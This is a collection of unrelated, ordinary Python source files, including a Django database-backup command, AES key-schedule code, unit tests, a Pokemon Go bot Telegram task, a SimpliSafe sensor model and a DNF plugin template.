{"text": "\"\"\"\nSave database.\n\"\"\"\nfrom __future__ import (absolute_import, division,\n                        print_function, unicode_literals)\n\nimport os\nimport re\nfrom datetime import datetime\nimport tempfile\nfrom optparse import make_option\n\nfrom django.conf import settings\nfrom django.core.management.base import CommandError\n\nfrom ._base import BaseDbBackupCommand\nfrom ...dbcommands import DBCommands\nfrom ...storage.base import BaseStorage, StorageError\nfrom ... import utils, settings as dbbackup_settings\n\n\nclass Command(BaseDbBackupCommand):\n    help = \"\"\"\n    Backup a database, encrypt and/or compress and write to storage.\n    \"\"\"\n    option_list = BaseDbBackupCommand.option_list + (\n        make_option(\"-c\", \"--clean\", help=\"Clean up old backup files\", action=\"store_true\", default=False),\n        make_option(\"-d\", \"--database\", help=\"Database to backup (default: everything)\"),\n        make_option(\"-s\", \"--servername\", help=\"Specify server name to include in backup filename\"),\n        make_option(\"-z\", \"--compress\", help=\"Compress the backup files\", action=\"store_true\", default=False),\n        make_option(\"-e\", \"--encrypt\", help=\"Encrypt the backup files\", action=\"store_true\", default=False),\n    )\n\n    @utils.email_uncaught_exception\n    def handle(self, **options):\n        \"\"\"Django command handler.\"\"\"\n        self.verbosity = int(options.get('verbosity'))\n        self.quiet = options.get('quiet')\n        self.clean = options.get('clean')\n        self.clean_keep = dbbackup_settings.CLEANUP_KEEP\n        self.database = options.get('database')\n        self.servername = options.get('servername')\n        self.compress = options.get('compress')\n        self.encrypt = options.get('encrypt')\n        self.storage = BaseStorage.storage_factory()\n        database_keys = (self.database,) if self.database else dbbackup_settings.DATABASES\n        for database_key in database_keys:\n            database = settings.DATABASES[database_key]\n            self.dbcommands = DBCommands(database)\n            try:\n                self.save_new_backup(database)\n                if self.clean:\n                    self.cleanup_old_backups(database)\n            except StorageError as err:\n                raise CommandError(err)\n\n    def save_new_backup(self, database):\n        \"\"\"\n        Save a new backup file.\n        \"\"\"\n        if not self.quiet:\n            self.log(\"Backing Up Database: %s\" % database['NAME'], 1)\n        filename = self.dbcommands.filename(self.servername)\n        outputfile = tempfile.SpooledTemporaryFile(\n            max_size=dbbackup_settings.TMP_FILE_MAX_SIZE,\n            dir=dbbackup_settings.TMP_DIR)\n        self.dbcommands.run_backup_commands(outputfile)\n        if self.compress:\n            compressed_file, filename = utils.compress_file(outputfile, filename)\n            outputfile = compressed_file\n        if self.encrypt:\n            encrypted_file, filename = utils.encrypt_file(outputfile, filename)\n            outputfile = encrypted_file\n        if not self.quiet:\n            self.log(\"  Backup tempfile created: %s\" % (utils.handle_size(outputfile)), 1)\n            self.log(\"  Writing file to %s: %s, filename: %s\" % (self.storage.name, self.storage.backup_dir, filename), 1)\n        self.storage.write_file(outputfile, filename)\n\n    def cleanup_old_backups(self, database):\n        \"\"\"\n        Cleanup old backups, keeping the number of backups specified by\n        DBBACKUP_CLEANUP_KEEP and any backups that occur on first of the month.\n        \"\"\"\n        if not self.quiet:\n            self.log(\"Cleaning Old Backups for: %s\" % database['NAME'], 1)\n        filepaths = self.storage.list_directory()\n        filepaths = self.dbcommands.filter_filepaths(filepaths)\n        for filepath in sorted(filepaths[0:-self.clean_keep]):\n            regex = r'^%s' % self.dbcommands.filename_match(self.servername, '(.*?)')\n            datestr = re.findall(regex, os.path.basename(filepath))[0]\n            dateTime = datetime.strptime(datestr, dbbackup_settings.DATE_FORMAT)\n            if int(dateTime.strftime(\"%d\")) != 1:\n                if not self.quiet:\n                    self.log(\"  Deleting: %s\" % filepath, 1)\n                self.storage.delete_file(filepath)\n"}
{"text": "import unittest\nimport numpy as np\n\nfrom repstruct.features.descriptor import normalize_by_division, classify_euclidean, normalize, classify_cosine\n\n\nclass TestDescriptor(unittest.TestCase):\n\n    def setUp(self):\n        pass\n\n    def tearDown(self):\n        pass\n    \n    def testNormalize(self):\n        v = [1, 1]\n        X = np.array([v])\n        \n        result = normalize(X)\n        \n        norm = np.sqrt(np.sum(np.multiply(result, result), axis=1))\n        \n        self.assertLess(abs(1.0 - norm), 0.0000001, 'The norm is not one for the normalized array.')\n        \n    def testNormalizeMultipleVectors(self):\n        v = [1, 1]\n        X = np.array([v, v, v])\n        \n        result = normalize(X)\n        \n        norm = np.sqrt(np.sum(np.multiply(result, result), axis=1))\n        \n        self.assertLess(abs(1.0 - norm[0]), 0.0000001, 'The norm is not one for the normalized array.')\n        self.assertLess(abs(1.0 - norm[1]), 0.0000001, 'The norm is not one for the normalized array.')\n        self.assertLess(abs(1.0 - norm[2]), 0.0000001, 'The norm is not one for the normalized array.')\n\n    def testNormalizeByDivision(self):\n        l = [1, 2]\n        v = np.array(l)\n        n = np.array(l)\n        \n        result = normalize_by_division(v, n)\n        \n        self.assertLess(abs(1.0 - np.linalg.norm(result)), 0.0000001, 'The norm is not one for the normalized array.')\n        self.assertEquals(result[0], result[1], 'The vector items should be equal after normalization.')  \n        \n    def testClassifyEuclideanOneVector(self):\n        X = normalize(np.array([[1, 1]]))\n        C = normalize(np.array([[1, 1], [0, 1]]))\n        \n        result = classify_euclidean(X, C)\n        \n        self.assertEqual(2, result.shape[0])\n        self.assertEqual(1, result[0])\n        self.assertEqual(0, result[1])\n        \n    def testClassifyEuclideanMultipleVectors(self):\n        X = normalize(np.array([[1, 0, 0], [0, 1, 0], [0, 0, 1]]))\n        C = normalize(np.array([[1, 0, 0], [0, 1, 0], [0, 0, 1]]))\n        \n        result = classify_euclidean(X, C)\n        \n        self.assertEqual(3, result.shape[0])\n        self.assertEqual(3, np.sum(result))\n        self.assertEqual(1, result[0])\n        self.assertEqual(1, result[1])\n        self.assertEqual(1, result[2])\n        \n    def testClassifyEuclideanMultipleVectorsSameCenter(self):\n        X = normalize(np.array([[1, 0, 0], [1, 0, 0], [1, 0, 0]]))\n        C = normalize(np.array([[1, 0, 0], [0, 1, 0], [0, 0, 1]]))\n        \n        result = classify_euclidean(X, C)\n        \n        self.assertEqual(3, result.shape[0])\n        self.assertEqual(3, np.sum(result))\n        self.assertEqual(3, result[0])\n        self.assertEqual(0, result[1])\n        self.assertEqual(0, result[2])\n        \n    def testClassifyCosineOneVector(self):\n        X = normalize(np.array([[1, 1]]))\n        C = normalize(np.array([[1, 1], [0, 1]]))\n        \n        result = classify_cosine(X, C)\n        \n        self.assertEqual(2, result.shape[0])\n        self.assertEqual(1, result[0])\n        self.assertEqual(0, result[1])\n        \n    def testClassifyCosineMultipleVectors(self):\n        X = normalize(np.array([[1, 0, 0], [0, 1, 0], [0, 0, 1]]))\n        C = normalize(np.array([[1, 0, 0], [0, 1, 0], [0, 0, 1]]))\n        \n        result = classify_cosine(X, C)\n        \n        self.assertEqual(3, result.shape[0])\n        self.assertEqual(3, np.sum(result))\n        self.assertEqual(1, result[0])\n        self.assertEqual(1, result[1])\n        self.assertEqual(1, result[2])\n        \n    def testClassifyCosineMultipleVectorsSameCenter(self):\n        X = normalize(np.array([[1, 0, 0], [1, 0, 0], [1, 0, 0]]))\n        C = normalize(np.array([[1, 0, 0], [0, 1, 0], [0, 0, 1]]))\n        \n        result = classify_cosine(X, C)\n        \n        self.assertEqual(3, result.shape[0])\n        self.assertEqual(3, np.sum(result))\n        self.assertEqual(3, result[0])\n        self.assertEqual(0, result[1])\n        self.assertEqual(0, result[2])\n\n\nif __name__ == '__main__':\n    unittest.main()"}
{"text": " # -*- coding: utf-8 -*-\n#KeySchedule\nfrom Rijndael.SubBytes import *\nfrom Rijndael.Tables import RijndaelRcon\nimport math\n\ndef RotWord(Spalte):\n    #Verschiebe die Plaetze im Array\n    output = list()\n    output.append(Spalte[1])\n    output.append(Spalte[2])\n    output.append(Spalte[3])\n    output.append(Spalte[0])\n    return output\n\ndef XorRcon(Spalte, SpalteVor4, RconCount):\n    #Verknuepfe Schritt fuer Schritt die Sonderfaelle(immer die erste Spalte eines RoundKeys) Xor, inklusive der RconTabelle\n    output = list()\n    Rcon = RijndaelRcon.Rcon[RconCount]\n    for i in range(0,4):\n        output.append(format(int(Spalte[i],16)^int(SpalteVor4[i], 16)^int(format(Rcon[i], '#04x'),16), '#04x'))\n\n    return output\n\ndef Xor(Spalte, SpalteVor4):\n    #Verknuepfe Wert fuer Wert Xor\n    output = list()\n    for i in range(0,4):\n        output.append(format(int(Spalte[i], 16)^int(SpalteVor4[i], 16), '#04x'))#Hexadezimal\n\n    return output\n\n\n\ndef KeySchedule(Key):\n    #Erweitere den Schluessel auf insgesamt 10 weitere von einander abhaengige Schluessel\n    roundCounter = 0\n    for i in range(4,41,4):\n        Key.append(RotWord(Key[i-1]))\n        Key[i] = TranslateToSBox(Key[i])\n        Key[i] = XorRcon(Key[i],Key[i-4],roundCounter)\n        roundCounter += 1\n        for j in range(i+1,i+4):\n            Key.append(Xor(Key[j-1],Key[j-4]))\n            \n    return Key\n"}
{"text": "\"\"\"\nProblem Statement\n\nIn the previous challenge, you wrote code to perform an Insertion Sort on an\nunsorted array. But how would you prove that the code is correct? I.e. how\ndo you show that for any input your code will provide the right output?\n\nLoop Invariant\nIn computer science, you could prove it formally with a loop invariant,\nwhere you state that a desired property is maintained in your loop. Such a\nproof is broken down into the following parts:\n\nInitialization: It is true (in a limited sense) before the loop runs.\nMaintenance: If it's true before an iteration of a loop, it remains true\nbefore the next iteration.\nTermination: It will terminate in a useful way once it is finished.\nInsertion Sort's Invariant\nSay, you have some InsertionSort code, where the outer loop goes through the\nwhole array A:\n\nfor(int i = 1; i < A.length; i++){\n//insertion sort code\nYou could then state the following loop invariant:\n\nAt the start of every iteration of the outer loop (indexed with i),\nthe subarray until ar[i] consists of the original elements that were there,\nbut in sorted order.\n\nTo prove Insertion Sort is correct, you will then demonstrate it for the\nthree stages:\n\nInitialization - The subarray starts with the first element of the array,\nand it is (obviously) sorted to begin with.\n\nMaintenance - Each iteration of the loop expands the subarray, but keeps the\nsorted property. An element V gets inserted into the array only when it is\ngreater than the element to its left. Since the elements to its left have\nalready been sorted, it means V is greater than all the elements to its\nleft, so the array remains sorted. (In Insertion Sort 2 we saw this by\nprinting the array each time an element was properly inserted.)\n\nTermination - The code will terminate after i has reached the last element\nin the array, which means the sorted subarray has expanded to encompass the\nentire array. The array is now fully sorted.\n\nLoop Invariant Chart\n\nYou can often use a similar process to demonstrate the correctness of many\nalgorithms. You can see these notes for more information.\n\nChallenge\n\nIn the InsertionSort code below, there is an error. Can you fix it? Print\nthe array only once, when it is fully sorted.\n\nDetails\nThe Input format and the constraints are the same as in the previous\nchallenges and are presented below.\n\nInput Format\nThere will be two lines of input:\n\ns - the size of the array\nar - the list of numbers that makes up the array\nOutput Format\nOutput the numbers in order, space-separated.\n\nConstraints\n1<=s<=1000\n-1500<=V<=1500,V = ar\nSample Input\n\n6\n1 4 3 5 6 2\nSample Output\n\n1 2 3 4 5 6\n\"\"\"\n\n\ndef insertion_sort(l):\n    for i in range(1, len(l)):\n        j = i - 1\n        key = l[i]\n        while (l[j] > key) and (j >= 0):\n            l[j + 1] = l[j]\n            j -= 1\n        l[j + 1] = key\n\n\nm = int(input().strip())\nar = [int(i) for i in input().strip().split()]\ninsertion_sort(ar)\nprint(\" \".join(map(str, ar)))\n"}
{"text": "\"\"\"\nThe command line interface requires some persistent global state to operate\neffectively. It stores this state in a JSON file in a hidden directory in the\nuser's home folder. The following is a record of all of the keys in that JSON\nfile and what they mean.\n\nconfig[\"cloud_server\"] - Holds information about the cloud CouchDB instance\nselected by the current user\n\nconfig[\"cloud_server\"][\"url\"] - The URL of the cloud server (e.g.\n\"http://openag.mit.edu:5984\")\n\nconfig[\"cloud_server\"][\"username\"] and\nconfig[\"cloud_server\"][\"password\"] - The credentials with which to log in to\nthe cloud server\n\nconfig[\"cloud_server\"][\"farm_name\"] - The name of the farm on the cloud server\ninto which to mirror data\n\nconfig[\"local_server\"] - Holds information about the local CouchDB instance\nselected by the current user\n\nconfig[\"local_server\"][\"url\"] - The URL of the local server\n\"\"\"\nimport os\nimport json\nimport errno\nfrom click import get_app_dir\n\nCONFIG_FOLDER = get_app_dir(\"openag\", force_posix=True)\nCONFIG_FILE = os.path.join(CONFIG_FOLDER, \"config.json\")\n\nclass PersistentObj(object):\n    def __init__(self, data, parent):\n        self._data = data\n        self._parent = parent\n\n    def __getitem__(self, attr):\n        val = self._data.get(attr, dict())\n        self._data[attr] = val\n        if isinstance(val, dict):\n            return PersistentObj(val, self)\n        else:\n            return val\n\n    def __setitem__(self, attr, value):\n        self._data[attr] = value\n        self._save()\n\n    def __delitem__(self, attr):\n        del self._data[attr]\n        self._save()\n\n    def __nonzero__(self):\n        return bool(self._data)\n\n    def __iter__(self):\n        self._clean()\n        for key in self._data:\n            yield key\n\n    def items(self):\n        self._clean()\n        for k in self:\n            yield k, self[k]\n\n    def _clean(self):\n        for k,v in self._data.items():\n            if not v:\n                del self._data[k]\n\n    def _save(self):\n        self._clean()\n        self._parent._save()\n\nclass Config(PersistentObj):\n    def __init__(self, filename=CONFIG_FILE):\n        self.filename = filename\n        folder = os.path.dirname(filename)\n        try:\n            os.makedirs(folder)\n        except OSError as e:\n            if e.errno == errno.EEXIST and os.path.isdir(folder):\n                pass\n            else:\n                raise\n        try:\n            with open(filename) as f:\n                self._data = json.load(f)\n        except (IOError, ValueError):\n            self._data = {}\n\n    def _save(self):\n        self._clean()\n        with open(self.filename, \"w+\") as f:\n            json.dump(self._data, f)\n\nconfig = Config()\n"}
{"text": "\"\"\"Define a SimpliSafe sensor.\"\"\"\nimport logging\nfrom enum import Enum\nfrom typing import Union\n\nfrom .errors import SimplipyError\n\n_LOGGER = logging.getLogger(__name__)\n\n\nclass SensorTypes(Enum):\n    \"\"\"Define sensor types.\"\"\"\n\n    keypad = 1\n    keychain = 2\n    panic_button = 3\n    motion = 4\n    entry = 5\n    glass_break = 6\n    carbon_monoxide = 7\n    smoke = 8\n    leak = 9\n    temperature = 10\n    siren = 13\n    unknown = 99\n\n\nclass Sensor:\n    \"\"\"Define a base SimpliSafe sensor.\"\"\"\n\n    def __init__(self, sensor_data: dict) -> None:\n        \"\"\"Initialize.\"\"\"\n        self.sensor_data = sensor_data\n\n        try:\n            self._type = SensorTypes(sensor_data['type'])\n        except ValueError:\n            _LOGGER.error('Unknown sensor type: %s', self.sensor_data['type'])\n            self._type = SensorTypes.unknown\n\n    @property\n    def name(self) -> str:\n        \"\"\"Return the sensor name.\"\"\"\n        return self.sensor_data['name']\n\n    @property\n    def serial(self) -> str:\n        \"\"\"Return the serial number.\"\"\"\n        return self.sensor_data['serial']\n\n    @property\n    def type(self) -> SensorTypes:\n        \"\"\"Return the sensor type.\"\"\"\n        return self._type\n\n\nclass SensorV2(Sensor):\n    \"\"\"Define a V2 (old) sensor.\"\"\"\n\n    @property\n    def data(self) -> int:\n        \"\"\"Return the sensor's current data.\"\"\"\n        return self.sensor_data['sensorData']\n\n    @property\n    def error(self) -> bool:\n        \"\"\"Return the sensor's error status.\"\"\"\n        return self.sensor_data['error']\n\n    @property\n    def low_battery(self) -> bool:\n        \"\"\"Return whether the sensor's battery is low.\"\"\"\n        return self.sensor_data.get('battery', 'ok') != 'ok'\n\n    @property\n    def settings(self) -> bool:\n        \"\"\"Return the sensor's settings.\"\"\"\n        return self.sensor_data['setting']\n\n    @property\n    def trigger_instantly(self) -> bool:\n        \"\"\"Return whether the sensor will trigger instantly.\"\"\"\n        return self.sensor_data['instant']\n\n    @property\n    def triggered(self) -> bool:\n        \"\"\"Return the current sensor state.\"\"\"\n        if self.type == SensorTypes.entry:\n            return self.sensor_data.get('entryStatus', 'closed') == 'open'\n\n        raise SimplipyError(\n            'Cannot determine triggered state for sensor: {0}'.format(\n                self.name))\n\n\nclass SensorV3(Sensor):\n    \"\"\"Define a V3 (new) sensor.\"\"\"\n\n    @property\n    def error(self) -> bool:\n        \"\"\"Return the sensor's error status.\"\"\"\n        return self.sensor_data['status'].get('malfunction', False)\n\n    @property\n    def low_battery(self) -> bool:\n        \"\"\"Return whether the sensor's battery is low.\"\"\"\n        return self.sensor_data['flags']['lowBattery']\n\n    @property\n    def offline(self) -> bool:\n        \"\"\"Return whether the sensor is offline.\"\"\"\n        return self.sensor_data['flags']['offline']\n\n    @property\n    def settings(self) -> dict:\n        \"\"\"Return the sensor's settings.\"\"\"\n        return self.sensor_data['setting']\n\n    @property\n    def trigger_instantly(self) -> bool:\n        \"\"\"Return whether the sensor will trigger instantly.\"\"\"\n        return self.sensor_data['setting']['instantTrigger']\n\n    @property\n    def triggered(self) -> bool:\n        \"\"\"Return the sensor's status info.\"\"\"\n        if self.type in (SensorTypes.motion, SensorTypes.entry,\n                         SensorTypes.glass_break, SensorTypes.carbon_monoxide,\n                         SensorTypes.smoke, SensorTypes.leak,\n                         SensorTypes.temperature):\n            return self.sensor_data['status'].get('triggered', False)\n\n        return False\n\n    @property\n    def temperature(self) -> Union[None, int]:\n        \"\"\"Return the sensor's status info.\"\"\"\n        if self.type != SensorTypes.temperature:\n            raise AttributeError(\n                'Non-temperature sensor cannot have a temperature')\n\n        return self.sensor_data['status']['temperature']\n"}
{"text": "# -*- coding: utf-8 -*-\nimport telegram\nimport os\nimport logging\nimport json\nfrom pokemongo_bot.base_task import BaseTask\nfrom pokemongo_bot.base_dir import _base_dir\nfrom pokemongo_bot.event_handlers import TelegramHandler\n\nfrom pprint import pprint\nimport re\n\nclass TelegramTask(BaseTask):\n    SUPPORTED_TASK_API_VERSION = 1\n    update_id = None\n    tbot = None\n\n    def initialize(self):\n        if not self.enabled:\n            return\n        self.logger = logging.getLogger(type(self).__name__)\n        api_key = self.bot.config.telegram_token\n        if api_key == None:\n            self.emit_event(\n                'config_error',\n                formatted='api_key not defined.'\n            )\n            return\n        self.tbot = telegram.Bot(api_key)\n        if self.config.get('master',None):\n            self.bot.event_manager.add_handler(TelegramHandler(self.tbot,self.config.get('master',None),self.config.get('alert_catch')))\n        try:\n            self.update_id = self.tbot.getUpdates()[0].update_id\n        except IndexError:\n            self.update_id = None\n\n    def work(self):\n        if not self.enabled:\n            return\n        for update in self.tbot.getUpdates(offset=self.update_id, timeout=10):\n            self.update_id = update.update_id+1\n            if update.message:\n                self.logger.info(\"message from {} ({}): {}\".format(update.message.from_user.username, update.message.from_user.id, update.message.text))\n                if self.config.get('master',None) and self.config.get('master',None) not in [update.message.from_user.id, \"@{}\".format(update.message.from_user.username)]:\n                    self.emit_event( \n                            'debug', \n                            formatted=\"Master wrong: expecting {}, got {}({})\".format(self.config.get('master',None), update.message.from_user.username, update.message.from_user.id))\n                    continue\n                else:\n                    if not re.match(r'^[0-9]+$', \"{}\".format(self.config['master'])): # master was not numeric...\n                        self.config['master'] = update.message.chat_id\n                        idx = (i for i,v in enumerate(self.bot.event_manager._handlers) if type(v) is TelegramHandler).next()\n                        self.bot.event_manager._handlers[idx] = TelegramHandler(self.tbot,self.config['master'], self.config.get('alert_catch'))\n                        \n\n\n                if update.message.text == \"/info\":\n                    stats = self._get_player_stats()\n                    if stats:\n                        with self.bot.database as conn:\n                            cur = conn.cursor()\n                            cur.execute(\"SELECT DISTINCT COUNT(encounter_id) FROM catch_log WHERE dated >= datetime('now','-1 day')\")\n                            catch_day = cur.fetchone()[0]\n                            cur.execute(\"SELECT DISTINCT COUNT(pokestop) FROM pokestop_log WHERE dated >= datetime('now','-1 day')\")\n                            ps_day = cur.fetchone()[0]\n                            res = (\n                                \"*\"+self.bot.config.username+\"*\",\n                                \"_Level:_ \"+str(stats[\"level\"]),\n                                \"_XP:_ \"+str(stats[\"experience\"])+\"/\"+str(stats[\"next_level_xp\"]),\n                                \"_Pokemons Captured:_ \"+str(stats[\"pokemons_captured\"])+\" (\"+str(catch_day)+\" _last 24h_)\",\n                                \"_Poke Stop Visits:_ \"+str(stats[\"poke_stop_visits\"])+\" (\"+str(ps_day)+\" _last 24h_)\",\n                                \"_KM Walked:_ \"+str(stats[\"km_walked\"])\n                            )\n                            self.tbot.sendMessage(chat_id=update.message.chat_id, parse_mode='Markdown', text=\"\\n\".join(res))\n                            self.tbot.send_location(chat_id=update.message.chat_id, latitude=self.bot.api._position_lat, longitude=self.bot.api._position_lng)\n                    else:\n                        self.tbot.sendMessage(chat_id=update.message.chat_id, parse_mode='Markdown', text=\"Stats not loaded yet\\n\")\n                elif update.message.text == \"/start\" or update.message.text == \"/help\":\n                    res = (\n                        \"Commands: \",\n                        \"/info - info about bot\"\n                    )\n                    self.tbot.sendMessage(chat_id=update.message.chat_id, parse_mode='Markdown', text=\"\\n\".join(res))\n\n    def _get_player_stats(self):\n        \"\"\"\n        Helper method parsing the bot inventory object and returning the player stats object.\n        :return: The player stats object.\n        :rtype: dict\n        \"\"\"\n        web_inventory = os.path.join(_base_dir, \"web\", \"inventory-%s.json\" % self.bot.config.username)\n        with open(web_inventory, \"r\") as infile:\n            json_inventory = json.load(infile)\n            infile.close()\n        return next((x[\"inventory_item_data\"][\"player_stats\"]\n                     for x in json_inventory\n                     if x.get(\"inventory_item_data\", {}).get(\"player_stats\", {})),\n                    None)\n"}
{"text": "\"\"\"\nDjango settings for hello_world project.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/1.6/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/1.6/ref/settings/\n\"\"\"\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nimport os\nBASE_DIR = os.path.dirname(os.path.dirname(__file__))\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/1.6/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '9!b5_lhnc(y6vq&krdeqs*%j)gbl#k&g6gjpc5&wv7klw#%5=w'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nTEMPLATE_DEBUG = True\n\nTEMPLATE_DIRS = (\n    # Put strings here, like \"/home/html/django_templates\" or \"C:/www/django/templates\".\n    # Always use forward slashes, even on Windows.\n    # Don't forget to use absolute paths, not relative paths.\n\t'example'\n)\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = (\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n)\n\nMIDDLEWARE_CLASSES = (\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n)\n\nROOT_URLCONF = 'hello_world.urls'\n\nWSGI_APPLICATION = 'hello_world.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/1.6/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),\n    }\n}\n\n# Internationalization\n# https://docs.djangoproject.com/en/1.6/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/1.6/howto/static-files/\n\nSTATIC_URL = '/static/'\n"}
{"text": "\"\"\"JsonConfig base class spec.\"\"\"\nfrom __future__ import unicode_literals\n\nfrom unittest import TestCase\n\nfrom importconfig import JsonConfig\nfrom importconfig import jsonconfig\n\n\nclass TestJsonConfig(TestCase):\n\n    \"\"\"Test the JsonConfig class.\n\n    This test doesn't need much as almost everything\n    is covered in 'test_importconfig.py'.\n    \"\"\"\n\n    def test_load_config(self):\n        \"\"\"Load the config into a dict, expanding any imports along the way.\n\n        Asserting 'hello' is in the expanded result as \"hello\": \"world\" is\n        in the imported file.\n        \"\"\"\n        config = JsonConfig('./tests/resources/json/simple.json')\n        assert 'hello' in config.load().keys()\n\n    def test_jsonconfig_method(self):\n        \"\"\"Test that the jsonconfig (method version) works.\n\n        Asserting that jsonconfig will return a ``dict`` if ``lazy=False``\n        or an instance of ``JsonConfig`` if ``lazy=True``.\n        \"\"\"\n        eager = jsonconfig('./tests/resources/json/simple.json', lazy=False)\n        assert type(eager) is dict\n        lazy = jsonconfig('./tests/resources/json/simple.json', lazy=True)\n        assert isinstance(lazy, JsonConfig)\n"}
{"text": "#    dnf-utils - add-on tools for DNF\n#    Copyright (C) 2014 Tim Lauridsen < timlau<AT>fedoraproject<DOT>org >\n#\n#    This program is free software; you can redistribute it and/or modify\n#    it under the terms of the GNU General Public License as published by\n#    the Free Software Foundation; either version 2 of the License, or\n#    (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU General Public License for more details.\n#\n#    You should have received a copy of the GNU General Public License\n#    along with this program; if not, write to the Free Software\n#    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.\n\nfrom dnfutils import logger, _\n\nimport dnf\nimport dnf.cli\nimport dnf.exceptions\nimport dnfutils\n\n\n# TODO: dnf Plugin class, rename to your <Command>\nclass Sample(dnf.Plugin):\n\n    # TODO: Use your own command name here (lowercase)\n    name = 'sample'\n\n    def __init__(self, base, cli):\n        self.base = base\n        self.cli = cli\n        logger.debug('Initialized %s plugin', self.name)\n        if self.cli is not None:\n            # TODO: use your own <Command>Command class here\n            self.cli.register_command(SampleCommand)\n\n\n# TODO: dnf Command class, rename to your <Command>Command\nclass SampleCommand(dnf.cli.Command):\n    \"\"\" the util command there is extending the dnf command line \"\"\"\n\n    # TODO: the tool command, use your own command\n    aliases = [\"sample\"]\n\n    # TODO: summary for util, shown in dnf help, add your own\n    summary = _('One line description of the util')\n    # TODO usage string for the util, shown by dnf help <command>\n    usage = _('[PARAMETERS]')\n\n    def configure(self, args):\n        \"\"\" setup the client demands\"\"\"\n        demands = self.cli.demands\n        demands.sack_activation = True\n        demands.available_repos = True\n\n    def run(self, args):\n        \"\"\" execute the util action here \"\"\"\n        # Setup ArgumentParser to handle util\n        # You must only add options not used by dnf already\n        parser = dnfutils.ArgumentParser(self.aliases[0])\n        # TODO: example options/arg add your own\n        parser.add_argument('cmd', nargs=1, help='the sub command')\n        parser.add_argument('parms', nargs='*',\n                            help='the parameters to the sub command')\n        parser.add_argument(\"--some-option\", action='store_true',\n                            help='an optional option')\n\n        # parse the options/args\n        # list available options/args on errors & exit\n        opts = parser.parse_args(args)\n\n        # show util help & exit\n        if opts.help_cmd:\n            print(parser.format_help())\n            return\n\n        # TODO: the main tool code, add your own\n        print('Sample util is running with :')\n        print('    cmd =       : %s' % opts.cmd)\n        print('    parms =     : %s' % opts.parms)\n        print('    some-option : %s' % opts.some_option)\n"}
{"text": "#  Copyright (c) 2014 Artem Rozumenko (artyom.rozumenko@gmail.com)\n#\n#  Licensed under the Apache License, Version 2.0 (the \"License\");\n#  you may not use this file except in compliance with the License.\n#  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS,\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n#  See the License for the specific language governing permissions and\n#  limitations under the License.\n\nfrom unittest import TestCase, TextTestRunner, TestLoader\nimport logging\n\nfrom locustdriver import LocustDriver\n\n\nclass SimpleFailoverTest(TestCase):\n    @classmethod\n    def setUpClass(cls):\n        \"\"\"Setup class method in unittests.\"\"\"\n        cls.driver = LocustDriver()\n        cls.driver.add_node(node_name='local_test',\n                            node_ip='127.0.0.1:8080',\n                            node_group='main',\n                            key='test')\n        logging.basicConfig(level=logging.DEBUG,\n                            format='%(asctime)-10s : %(message)s',\n                            datefmt='%y-%m-%d %H:%M:%S')\n\n    def test_get_process(self):\n        \"\"\"Test for gracefull stop ngnix.\"\"\"\n        result = self.driver.get_process(nodes=\"local_test\", names=\"nano\")\n        logging.debug(result)\n        self.assertTrue('nano' in result['local_test']['list'][0]['name'])\n\n\nif __name__ == '__main__':\n    SUITE = TestLoader().loadTestsFromTestCase(SimpleFailoverTest)\n    TextTestRunner(verbosity=2).run(SUITE)\n\n"}
